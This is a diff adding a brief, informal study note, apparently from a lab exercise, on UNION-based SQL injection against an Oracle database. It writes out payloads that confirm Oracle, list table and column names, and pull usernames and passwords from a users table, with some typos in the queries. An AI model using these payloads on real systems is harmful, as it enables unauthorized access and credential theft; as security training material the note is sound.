@@ -1,0 +1,8 @@
+SQL injection attack, listing the database contents on Oracle
+
+same as before but now its an oracle db
+use ' union select null,null from dual— to confirm its oracle
+then  use ' union select table_name, null from all_tables to list all the table names ang here you can see the sus looking table users_sthsthsth use that and ...
+select column_name,null from all_tab_columns where table_name eq 'the table name we got bef'
+use that in ' union select username_xx, pass_xx from users_xx
+
